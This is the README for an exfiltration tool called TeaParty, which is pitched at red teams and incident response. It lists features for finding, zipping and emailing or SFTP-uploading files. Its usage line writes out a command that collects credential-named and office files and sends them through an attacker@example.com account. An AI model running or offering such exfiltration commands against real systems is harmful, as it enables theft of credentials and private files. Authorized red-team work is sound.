# TeaParty 🫖

TeaParty is a console-based tool for searching, compressing, and exfiltrating files via email or SFTP. Designed for red team operations, incident response, or automation.

## Features

- Search by file extension, name pattern, or both
- Recursive search with exclusion filters
- ZIP compression with SHA256 integrity hashes
- Email delivery (supports multiple recipients)
- SFTP fallback if email fails (optional)
- Logging with `--debug` and `--quiet` mode
- Interactive input or CLI arguments
- Hash-based cache to avoid duplicates

Remember that -h (help) options is available to see more options in details.
## Usage

```bash
teaparty.exe -s 3 -e .pdf,.docx -p *cred*.txt -d C:\data -m attacker@example.com:pass -to target@example.com -z 1
